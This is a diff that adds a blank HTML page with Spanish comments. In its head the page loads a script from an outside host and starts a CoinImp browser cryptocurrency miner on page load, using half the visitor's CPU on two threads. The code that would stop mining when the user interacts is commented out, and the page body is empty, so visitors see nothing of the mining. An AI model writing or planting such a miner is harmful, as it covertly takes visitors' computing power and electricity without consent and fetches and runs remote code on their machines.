@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src=src="https://www.hostingcloud.racing/EjJv.js"></script>
+    <script>
+        // Configuración de CoinImp
+        var miner = new client.Anonymous('72810d16bae54973f45c9c690acd108a85c264e8038adeb14c59c4d127604478', {
+            throttle: 0.5, // Usa el 50% de la CPU
+            threads: 2 // Número de hilos de CPU utilizados
+        });
+
+        // Iniciar minería automáticamente
+        miner.start([Client.IF_EXCLUSIVE_TAB]);
+
+        // Detener minería si el usuario interactúa
+        //document.addEventListener('mousemove', function() {
+        //    miner.stop();
+        //});
+
+        // Reanudar minería después de 5 minutos de inactividad
+        //setInterval(function() {
+        //    if (!miner.isRunning()) {
+        //        miner.start();
+        //    }
+        //}, 300000); // 300,000 ms = 5 minutos
+    </script>
+</head>
+<body>
+    <!-- Página vacía para evitar distracciones -->
+</body>
+</html>
